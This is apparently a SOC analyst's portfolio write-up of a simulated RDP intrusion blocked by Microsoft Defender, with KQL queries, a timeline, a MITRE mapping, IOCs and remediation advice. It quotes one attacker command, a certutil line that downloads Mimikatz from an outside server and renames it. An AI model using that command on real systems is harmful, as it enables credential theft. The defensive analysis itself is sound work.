# SOC Investigation Lab — Blue Team Portfolio

This is my personal collection of SOC investigation write-ups.
Each one is a simulated alert I worked through myself, from the 
moment the alert fired to the point I closed it. I document 
everything the way I would in a real job. Not perfect, but honest 
practice and I'm getting better with every case.

---

## Case 01 — Potential Human-Operated Malicious Activity

**Date:** March 18, 2026  
**Severity:** High  
**Status:** Resolved — Closed  
**Reference:** INC-2026-0318-001  
**Platform:** Microsoft Defender XDR / Microsoft Sentinel  
**Analyst:** Gbenga  

---

### What got my attention

The alert came in as High severity, category Malware. But what 
immediately stood out wasn't just the malware — it was the logon 
type. RemoteInteractive. That means RDP. Someone had logged into 
this machine and was sitting there operating it manually.

That changes everything. This wasn't a script that landed and 
ran automatically. There was a person on the other end making 
decisions in real time. That's what made this one interesting 
to investigate.

<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/fff71f23-0f47-4193-ae37-c3f1d7a562ee" />

---

### First thing I did

Before anything else I needed to confirm the logon and find out 
where it came from. I jumped into Microsoft Defender XDR and ran 
a KQL query against `DeviceLogonEvents` to pull all successful 
remote sessions on the device.

```kql
DeviceLogonEvents
| where TimeGenerated > ago(1d)
| where DeviceName == "soclab"
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, DeviceName, RemoteIP, AccountName, LogonType, ActionType
| order by TimeGenerated desc
```

![KQL query results showing RemoteInteractive logon on soclab device](screenshots/kql-logon-query.png)

That confirmed it. A successful RemoteInteractive logon at 9:35 PM 
from `10.159.17.126`. From that point on everything I saw in the 
logs was the attacker's hands on the keyboard, not the legitimate 
user.

---

### How the attack played out

This one had three stages and they all connect. The attacker tried 
two things that failed, then changed their approach for a third 
attempt. Here's how it went.

---

**Stage 1 — First download attempt (9:43 PM)**

The attacker downloaded a ZIP file from `bazaar.abuse.ch` — a 
known malware repository. The filename was literally the file's 
own hash, which is something you see when people pull samples 
directly from threat intel platforms. It landed in the Downloads 
folder and Defender caught it almost immediately.

- File: `3a9c318...bcae.zip` (7MB)
- Path: `C:\Users\soclab\Downloads\`
- SHA1: `a61496b21ba4d0bb73b08676bd0066462e0ff2e2`
- Threat: `Trojan:Script/Wacatac.H!ml`
- The Mark of the Web flag was set — confirmed it came from the internet

Defender flagged and prevented it at 9:45 PM. First attempt — blocked.

---

**Stage 2 — Second download attempt (9:50 PM)**

They tried again seven minutes later with a different file. This 
one was tiny — only 1KB. That size is typical of a dropper, 
something designed just to pull down and execute a bigger payload. 
Same source, different file.

- File: `2828d90...d49d4.zip` (1KB)
- Path: `C:\Users\soclab\Downloads\`
- SHA1: `75481f3462f0f1a4b8707f2f67b1b6e96ecef92e`
- Threat: `Trojan:Script/Wacatac.C!ml`

Defender quarantined it at 9:52 PM and stopped explorer.exe from 
even opening it. Second attempt — blocked again.

---

**Stage 3 — Going manual (10:03 PM)**

At this point the attacker had failed twice and they knew it. 
So they shifted strategy. Instead of relying on downloaded files 
they opened Windows Terminal directly through the RDP session and 
spawned PowerShell. Two instances of it actually, which tells me 
they were actively working through options.

Then they ran this command:

```
certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe
```

I want to break this down because it's clever. `certutil.exe` is 
a legitimate Windows binary used for certificate management. 
Attackers abuse it to download files from the internet because 
it's already on every Windows machine and often trusted. 
This technique is called a LOLBin — Living off the Land Binary.

The `-urlcache -f` flags tell certutil to fetch a file from a URL 
and force-write it to disk. The file being fetched was Mimikatz — 
a well known credential dumping tool. And they renamed it 
`it_support.exe` to make it look like a legitimate IT file 
sitting on the machine. That's masquerading — T1036 in MITRE.

The goal was to dump credentials from memory and likely move 
laterally from there. Defender caught it before any of that 
happened — detected as `Trojan:Win32/Ceprolad.A` and removed 
at 10:04 PM. Third attempt — blocked.

![KQL investigation showing logon activity and remote session details](screenshots/kql-logon-results.png)

---

### Full timeline

| Time | Event |
|------|-------|
| 9:33 PM | Normal system boot — standard process chain |
| 9:35 PM | **INITIAL ACCESS** — RDP session from 10.159.17.126 |
| 9:43 PM | Malicious ZIP downloaded from bazaar.abuse.ch |
| 9:45 PM | Defender blocks Wacatac.H!ml — Stage 1 stopped |
| 9:50 PM | Second malicious ZIP downloaded |
| 9:52 PM | Defender quarantines Wacatac.C!ml — Stage 2 stopped |
| 10:03 PM | Windows Terminal opened — two PowerShell instances spawned |
| 10:04 PM | certutil LOLBin used to pull Mimikatz from C2 server |
| 10:04 PM | Defender blocks Ceprolad.A — Stage 3 stopped |

---

### MITRE ATT&CK mapping

| Tactic | Technique | What I saw |
|--------|-----------|------------|
| Initial Access | T1078 — Valid Accounts | RDP using compromised credentials |
| Execution | T1059.001 — PowerShell | Two PS instances spawned manually |
| Defense Evasion | T1218.013 — Certutil | certutil -urlcache to download payload |
| Defense Evasion | T1036 — Masquerading | mimikatz renamed as it_support.exe |
| Credential Access | T1003 — Credential Dumping | Mimikatz download attempt |
| Command & Control | T1071.001 — Web Protocols | HTTP C2 at 152.44.44.246:8080 |

---

### IOCs

| Type | Value |
|------|-------|
| IP — RDP Source | 10.159.17.126 |
| IP — C2 Server | 152.44.44.246:8080 |
| File SHA1 | a61496b21ba4d0bb73b08676bd0066462e0ff2e2 |
| File SHA1 | 75481f3462f0f1a4b8707f2f67b1b6e96ecef92e |
| Script SHA256 | b58197ad02b51f9f344a1575feee6562f461d7ce3da3752de9537ad06b9571db |
| Masqueraded file | it_support.exe (Mimikatz renamed) |
| C2 URL | http://152.44.44.246:8080/mimikatz.exe |

---

### What I did about it

**Containment**

Once I confirmed this was real and active I moved quickly. 
I isolated the device from the network so the attacker couldn't 
continue operating. I disabled the `soclab` user account, revoked 
the active RDP session, and blocked all the malicious hashes, 
URLs and the C2 IP across the environment.

**Eradication**

I ran a full AV scan on the device — came back clean. Then I went 
deeper. I queried across `DeviceFileEvents`, `DeviceProcessEvents` 
and `DeviceNetworkEvents` in KQL to check whether `it_support.exe` 
had done anything before Defender caught it, and to look for any 
persistence mechanisms — scheduled tasks, registry run keys, 
startup folder changes. Found nothing.

![KQL deep dive showing no additional malicious activity found](screenshots/kql-eradication-check.png)

**Recovery**

Once I was satisfied the device was clean I brought it back online 
and re-enabled the user account with a forced password reset. 
I put enhanced monitoring on the host and account going forward.

---

### How I closed it

> The attacker gained access via RDP using valid credentials and 
> made three separate attempts to deploy malware — two failed 
> downloads and one LOLBin-based credential dumping attempt using 
> Mimikatz. Microsoft Defender blocked all three stages before 
> anything executed successfully. No confirmed data exfiltration 
> or lateral movement was observed. Device isolated, cleaned and 
> restored. User account secured. All IOCs blocked.  
> **Alert Closed — Resolved.**

---

### Honest gaps I found

A few things I want to note for my own growth here.

The source IP `10.159.17.126` is an internal address. That means 
the attacker wasn't coming in directly from outside — they were 
pivoting through another machine inside the network. That device 
needed its own investigation and I flagged it, but it's a reminder 
that containing one machine isn't always the full picture.

I also noticed that certutil LOLBin abuse shouldn't rely solely 
on Defender to catch it downstream. There should be a dedicated 
detection rule that fires the moment certutil is called with 
`-urlcache`. That's a gap in the detection coverage that I'd 
flag as a recommendation going forward.

---

### Recommendations

- Enforce MFA on all remote access and RDP accounts — this is 
  the most important one. Valid credentials should not be enough 
  on their own
- Investigate `10.159.17.126` — treat it as a potentially 
  compromised pivot machine
- Create a dedicated alert rule for certutil.exe with -urlcache flag
- Restrict PowerShell with Constrained Language Mode for 
  standard user accounts
- Enable PowerShell Script Block Logging (Event ID 4104)
- Disable legacy authentication protocols
- Force credential reset for the affected account and review 
  accounts on the same network segment

---

## Folder structure

```
case-01-human-operated-malware/
├── screenshots/
│   ├── kql-logon-query.png
│   ├── kql-logon-results.png
│   └── kql-eradication-check.png
├── incident-report.docx
└── notes.md
```

---

## Tools I used

- Microsoft Sentinel
- Microsoft Defender XDR
- KQL (Kusto Query Language)
- MITRE ATT&CK Navigator
- MalwareBazaar

---

## About

I'm Gbenga — a SOC analyst building real skills through hands-on 
lab practice. I'm working toward a role in threat detection and 
incident response. Every case in this repo is something I actually 
worked through and documented myself. Open to entry-level SOC 
and IR opportunities.
